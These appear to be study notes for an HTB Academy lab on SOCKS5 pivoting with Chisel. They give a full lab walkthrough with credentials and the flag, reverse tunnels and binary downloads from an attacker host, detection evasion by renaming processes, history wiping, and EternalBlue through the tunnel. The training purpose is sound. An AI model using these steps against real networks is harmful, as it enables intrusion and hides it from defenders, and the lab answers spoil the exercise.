# **SOCKS5 Tunneling with Chisel - HTB Academy Page 13**

## **📋 Module Overview**

**Purpose:** TCP/UDP tunneling using HTTP transport secured with SSH  
**Tool:** Chisel - Go-based tunneling tool  
**Protocol:** HTTP with SSH encryption  
**Advantage:** Bypasses firewall restrictions, SOCKS5 proxy support  
**Use Case:** Internal network access, traffic pivoting, RDP tunneling  

---

## **1. Introduction to Chisel**

### **What is Chisel?**
- **Language:** Written in Go (Golang)
- **Transport:** HTTP-based tunneling
- **Security:** SSH encryption for data protection
- **Proxy Support:** SOCKS4/SOCKS5 proxy functionality
- **Modes:** Client-server and reverse tunneling
- **Platform:** Cross-platform (Windows, Linux, macOS)

### **How Chisel Works**
```
[Attack Host] ←HTTP/SSH→ [Pivot Host] ←Internal→ [Target Network]
Chisel Client              Chisel Server           172.16.5.0/23
SOCKS5 Proxy               Port Forward            Domain Controller
127.0.0.1:1080             Network Bridge          172.16.5.19
```

### **Chisel vs Other Tunneling Tools**

| **Aspect** | **Chisel** | **SSH Tunnel** | **Meterpreter** |
|------------|------------|----------------|-----------------|
| **Protocol** | HTTP/SSH | SSH | TCP |
| **Firewall Bypass** | Excellent | Limited | Good |
| **Setup Complexity** | Low | Low | Medium |
| **Performance** | High | High | Medium |
| **Platform Support** | Cross-platform | Limited | Windows Focus |
| **Binary Size** | ~11MB | N/A | Large |

---

## **2. Installation and Setup**

### **Method 1: Pre-built Binaries (Recommended)**

#### **Download Specific Version (HTB Academy Compatible)**
```bash
# HTB Academy requires v1.7.6 for compatibility
wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz

# Extract binary
gunzip chisel_1.7.6_linux_amd64.gz

# Make executable
chmod +x chisel_1.7.6_linux_amd64

# Verify version
./chisel_1.7.6_linux_amd64 version
```

#### **Download Latest Version**
```bash
# Check latest releases
curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | grep "browser_download_url.*linux_amd64" | cut -d '"' -f 4

# Example download (replace with latest version)
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
```

### **Method 2: Build from Source**

#### **Prerequisites**
```bash
# Install Go programming language
sudo apt update
sudo apt install golang-go

# Verify Go installation
go version
```

#### **Clone and Build**
```bash
# Clone Chisel repository
git clone https://github.com/jpillora/chisel.git
cd chisel

# Build binary
go build

# Result: chisel binary in current directory
ls -la chisel
```

#### **Cross-compilation for Different Platforms**
```bash
# Build for Windows
GOOS=windows GOARCH=amd64 go build -o chisel.exe

# Build for ARM64 Linux
GOOS=linux GOARCH=arm64 go build -o chisel_arm64

# Build for macOS
GOOS=darwin GOARCH=amd64 go build -o chisel_macos
```

### **Binary Size Optimization**
```bash
# Reduce binary size with build flags
go build -ldflags="-s -w" -o chisel_small

# Compare sizes
ls -lh chisel*

# Further compression with UPX
sudo apt install upx
upx --best chisel_small
```

---

## **3. Normal Mode - Server on Pivot Host**

### **Architecture Overview**
```
[Attack Host] → [Pivot Host] → [Internal Network]
Chisel Client   Chisel Server   Target Systems
127.0.0.1:1080  Port 1234       172.16.5.0/23
SOCKS5 Proxy    HTTP Listener   Domain Controller
```

### **Step 1: Transfer Binary to Pivot Host**
```bash
# SCP transfer to Ubuntu pivot host
scp chisel_1.7.6_linux_amd64 ubuntu@10.129.202.64:~/

# Alternative: HTTP download on pivot host
# On attack host: python3 -m http.server 8000
# On pivot host: wget http://10.10.14.17:8000/chisel_1.7.6_linux_amd64
```

### **Step 2: Start Server on Pivot Host**
```bash
# SSH to pivot host
ssh ubuntu@10.129.202.64

# Make binary executable
chmod +x chisel_1.7.6_linux_amd64

# Start Chisel server with SOCKS5 support
./chisel_1.7.6_linux_amd64 server -v -p 1234 --socks5

# Expected output:
# 2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
# 2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

### **Step 3: Connect Client from Attack Host**
```bash
# Start Chisel client
./chisel_1.7.6_linux_amd64 client -v 10.129.202.64:1234 socks

# Expected output:
# 2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
# 2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
# 2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
```

### **Step 4: Configure Proxychains**
```bash
# Edit proxychains configuration
sudo nano /etc/proxychains.conf

# Add SOCKS5 proxy entry
socks5 127.0.0.1 1080

# Comment out default SOCKS4 entry
#socks4 127.0.0.1 9050

# Verify configuration
tail -f /etc/proxychains.conf
```

### **Step 5: Use Tunnel for RDP**
```bash
# RDP to internal Domain Controller
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

# Alternative RDP tools
proxychains rdesktop 172.16.5.19
proxychains remmina
```

---

## **4. Reverse Mode - Server on Attack Host**

### **When to Use Reverse Mode**
- ✅ **Firewall blocks inbound connections** to pivot host
- ✅ **NAT restrictions** prevent external access
- ✅ **Egress-only** network policies
- ✅ **Better OPSEC** - server on attacker-controlled host

### **Architecture Overview**
```
[Attack Host] ← [Pivot Host] → [Internal Network]
Chisel Server   Chisel Client   Target Systems
Port 1234       Reverse Conn    172.16.5.0/23
SOCKS5 Listener R:socks         Domain Controller
```

### **Step 1: Start Reverse Server on Attack Host**
```bash
# Start Chisel server with reverse option
sudo ./chisel_1.7.6_linux_amd64 server --reverse -v -p 1234 --socks5

# Expected output:
# 2022/05/30 10:19:16 server: Reverse tunnelling enabled
# 2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
# 2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

### **Step 2: Connect Reverse Client from Pivot Host**
```bash
# On pivot host, connect with R:socks option
./chisel_1.7.6_linux_amd64 client -v 10.10.14.17:1234 R:socks

# Expected output:
# 2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
# 2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
# 2022/05/30 14:19:30 client: tun: SSH connected
```

### **Step 3: Configure Proxychains (Same as Normal Mode)**
```bash
# Proxychains still uses local SOCKS5 proxy
socks5 127.0.0.1 1080

# Test connection
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## **5. HTB Academy Lab Exercise**

### **Lab Challenge**
**"Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer."**

### **Lab Environment**
- **Target SSH:** Ubuntu pivot host with credentials `ubuntu:HTB_@cademy_stdnt!`
- **Internal Network:** 172.16.5.0/23
- **Domain Controller:** 172.16.5.19
- **DC Credentials:** `victor:pass@123`
- **Flag Location:** `C:\Users\victor\Documents\flag.txt`
- **Expected Flag:** `Th3$eTunne1$@rent8oring!`

### **Complete Lab Solution**

#### **Step 1: Download Chisel v1.7.6**
```bash
# On Pwnbox/Attack Host - download specific version
wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz

# Extract binary
gunzip chisel_1.7.6_linux_amd64.gz

# Make executable
chmod +x chisel_1.7.6_linux_amd64

# Verify version
./chisel_1.7.6_linux_amd64 version
```

#### **Step 2: Transfer to Pivot Host**
```bash
# SCP transfer to spawned Ubuntu target
scp chisel_1.7.6_linux_amd64 ubuntu@[TARGET_IP]:~/

# Example with real IP:
scp chisel_1.7.6_linux_amd64 ubuntu@10.129.202.64:~/

# Expected output:
# chisel_1.7.6_linux_amd64           100%   11MB   2.2MB/s   00:04
```

#### **Step 3: SSH to Pivot Host**
```bash
# Connect to Ubuntu pivot host
ssh ubuntu@[TARGET_IP]

# Example:
ssh ubuntu@10.129.202.64
# Password: HTB_@cademy_stdnt!

# Expected output:
# Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
# ubuntu@WEB01:~$
```

#### **Step 4: Start Chisel Server on Pivot**
```bash
# Make binary executable
chmod +x chisel_1.7.6_linux_amd64

# Start server with SOCKS5 on port 9001
./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5

# Expected output:
# 2024/07/22 15:58:14 server: Fingerprint ahzt0qJwsDsK64elAJZvaVS+AoqJhgbpnV56kZvn/b8=
# 2024/07/22 15:58:14 server: Listening on http://0.0.0.0:9001
```

#### **Step 5: Connect Client from Attack Host**
```bash
# On Pwnbox - connect to Chisel server
./chisel_1.7.6_linux_amd64 client -v [TARGET_IP]:9001 socks

# Example:
./chisel_1.7.6_linux_amd64 client -v 10.129.202.64:9001 socks

# Expected output:
# 2022/08/29 16:43:10 client: Connecting to ws://10.129.202.64:9001
# 2022/08/29 16:43:10 client: tun: proxy#127.0.0.1:1080=>socks: Listening
# 2022/08/29 16:43:11 client: Connected (Latency 87.992506ms)
# 2022/08/29 16:43:11 client: tun: SSH connected
```

#### **Step 6: Configure Proxychains**
```bash
# Verify proxychains configuration
tail -n2 /etc/proxychains.conf

# Should show:
#socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080

# If not configured, edit:
sudo nano /etc/proxychains.conf
# Add: socks5 127.0.0.1 1080
# Comment: #socks4 127.0.0.1 9050
```

#### **Step 7: RDP to Domain Controller**
```bash
# Use proxychains to RDP through tunnel
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'

# Expected connection details:
# Certificate details for 172.16.5.19:3389 (RDP-Server):
# Common Name: DC01.inlanefreight.local
# Subject:     CN = DC01.inlanefreight.local
# Accept certificate: Y
```

#### **Step 8: Retrieve Flag**
```cmd
# In RDP session, open Command Prompt
# Navigate to Documents folder
cd C:\Users\victor\Documents\

# Read flag file
type flag.txt

# Expected flag content:
Th3$eTunne1$@rent8oring!
```

#### **Lab Solution Summary**
```bash
# Attack Host Commands:
wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
gunzip chisel_1.7.6_linux_amd64.gz
chmod +x chisel_1.7.6_linux_amd64
scp chisel_1.7.6_linux_amd64 ubuntu@TARGET_IP:~/

# Pivot Host Commands:
ssh ubuntu@TARGET_IP
chmod +x chisel_1.7.6_linux_amd64
./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5

# Attack Host (new terminal):
./chisel_1.7.6_linux_amd64 client -v TARGET_IP:9001 socks
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'

# Target DC (RDP session):
type C:\Users\victor\Documents\flag.txt
```

---

## **6. Advanced Chisel Techniques**

### **Port Forwarding (Local)**
```bash
# Forward specific port instead of SOCKS proxy
./chisel client 10.129.202.64:1234 3389:172.16.5.19:3389

# Now connect directly to local port
xfreerdp /v:127.0.0.1:3389 /u:victor /p:pass@123
```

### **Port Forwarding (Remote)**
```bash
# Server with reverse mode
./chisel server --reverse -p 1234

# Client creating remote forward
./chisel client 10.10.14.17:1234 R:8080:172.16.5.19:80

# Now attack host port 8080 forwards to internal web server
```

### **Multiple Tunnels**
```bash
# Server supporting multiple connections
./chisel server -p 1234 --socks5

# Multiple clients can connect simultaneously
./chisel client 10.129.202.64:1234 socks    # Client 1
./chisel client 10.129.202.64:1234 socks    # Client 2
```

### **HTTP Proxy Mode**
```bash
# HTTP proxy instead of SOCKS
./chisel server -p 1234 --proxy http://127.0.0.1:8080

# Configure browsers to use HTTP proxy
# Proxy: 127.0.0.1:8080
```

---

## **7. Troubleshooting**

### **Common Issues**

#### **Version Compatibility**
```bash
# Problem: glibc version mismatch
./chisel: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.32' not found

# Solutions:
1. Use older Chisel version (v1.7.6)
   wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz

2. Static compilation
   go build -ldflags="-linkmode external -extldflags -static"

3. Use compatible binary for target OS
```

#### **Connection Issues**
```bash
# Problem: Connection refused
client: Connecting to ws://10.129.202.64:1234
client: dial tcp 10.129.202.64:1234: connection refused

# Solutions:
1. Check server is running
   ps aux | grep chisel

2. Verify port is listening
   netstat -tlnp | grep 1234

3. Check firewall rules
   sudo ufw status
```

#### **SOCKS Version Mismatch (COMMON)**
```bash
# Problem: Chisel server shows version errors
[ERR] socks: Unsupported SOCKS version: [4]
tun: conn#1: Close [0/1] (error Unsupported SOCKS version: [4])

# Root Cause: proxychains.conf uses socks4, but Chisel provides socks5

# Solution: Fix proxychains configuration
sudo nano /etc/proxychains4.conf

# Change from:
socks4 127.0.0.1 1080

# To:
socks5 127.0.0.1 1080

# Verify fix:
tail -n5 /etc/proxychains4.conf
```

#### **SOCKS Proxy Not Working**
```bash
# Problem: proxychains connection fails
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| 172.16.5.19
|S-chain|-<>-127.0.0.1:1080-<><>-4.2.2.1:53-<><>-OK
|DNS-response| 172.16.5.19 is 172.16.5.19

# Solutions:
1. Check SOCKS proxy is listening
   netstat -tlnp | grep 1080

2. Test with simple command
   proxychains curl http://172.16.5.19

3. Verify proxychains.conf
   tail /etc/proxychains.conf
```

#### **Binary Transfer Issues**
```bash
# Problem: SCP permission denied
scp: /tmp/chisel: Permission denied

# Solutions:
1. Transfer to user home directory
   scp chisel ubuntu@target:~/

2. Use different transfer method
   # Python HTTP server
   python3 -m http.server 8000
   # On target: wget http://attack_ip:8000/chisel

3. Check disk space
   df -h /tmp
```

### **Performance Optimization**
```bash
# Increase connection timeout
./chisel client --keepalive 30s target:1234 socks

# Disable compression for speed
./chisel server --no-compression -p 1234 --socks5

# Use different ports to avoid conflicts
./chisel server -p 8080 --socks5  # Server port
./chisel client target:8080 socks  # SOCKS on 1080
```

---

## **8. Operational Security (OPSEC)**

### **Stealth Considerations**
1. **HTTP Traffic** - appears as web traffic
2. **Custom User-Agent** - avoid detection signatures
3. **Port Selection** - use common HTTP ports (80, 8080, 8000)
4. **Traffic Analysis** - WebSocket upgrade patterns
5. **Binary Artifacts** - temporary files, process names

### **Detection Evasion**
```bash
# Use common ports
./chisel server -p 80 --socks5        # HTTP port
./chisel server -p 443 --socks5       # HTTPS port

# Custom headers to blend in
./chisel server --headers "Server: Apache/2.4.41"

# Process name obfuscation
cp chisel apache2
./apache2 server -p 80 --socks5
```

### **Cleanup Commands**
```bash
# Remove binary artifacts
rm -f chisel*
rm -f /tmp/chisel*

# Clear command history
history -c
unset HISTFILE

# Kill background processes
pkill -f chisel
```

---

## **9. Integration with Other Tools**

### **Metasploit Integration**
```bash
# Use Chisel SOCKS proxy with Metasploit
echo "setg Proxies socks5:127.0.0.1:1080" > /tmp/msf_proxy.rc
msfconsole -r /tmp/msf_proxy.rc

# All Metasploit traffic now goes through Chisel tunnel
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.5.19
exploit
```

### **Nmap through Tunnel**
```bash
# Scan internal network through SOCKS proxy
proxychains nmap -sT -Pn 172.16.5.0/24

# Service enumeration
proxychains nmap -sT -Pn -sV -p 80,443,3389 172.16.5.19
```

### **Web Application Testing**
```bash
# Configure Burp Suite to use SOCKS proxy
# Proxy settings: 127.0.0.1:1080 SOCKS5

# Browser with proxy
proxychains firefox http://172.16.5.19/webapp
```

---

## **10. Alternative Tools Comparison**

### **Chisel vs Similar Tools**

| **Tool** | **Protocol** | **Encryption** | **Proxy Type** | **Platform** | **Size** |
|----------|--------------|----------------|----------------|--------------|----------|
| **Chisel** | HTTP/WebSocket | SSH | SOCKS4/5, HTTP | Cross-platform | ~11MB |
| **SSF** | TCP | TLS | SOCKS4/5 | Cross-platform | ~15MB |
| **ngrok** | HTTP/HTTPS | TLS | HTTP | Cross-platform | ~25MB |
| **frp** | TCP/HTTP | TLS | Multiple | Cross-platform | ~20MB |
| **Ligolo** | TUN/TAP | TLS | Network layer | Cross-platform | ~10MB |

### **When to Choose Chisel**
✅ **HTTP-friendly environments**  
✅ **WebSocket support required**  
✅ **SSH encryption needed**  
✅ **Cross-platform compatibility**  
✅ **SOCKS proxy functionality**  
✅ **Moderate binary size acceptable**  

---

## **References**

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 13
- **Chisel GitHub**: [Official Repository](https://github.com/jpillora/chisel)
- **Chisel Releases**: [Binary Downloads](https://github.com/jpillora/chisel/releases)
- **Go Programming**: [Official Documentation](https://golang.org/doc/)
- **Oxdf Blog**: [Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
- **IppSec Video**: [Reddish Box Walkthrough](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s) 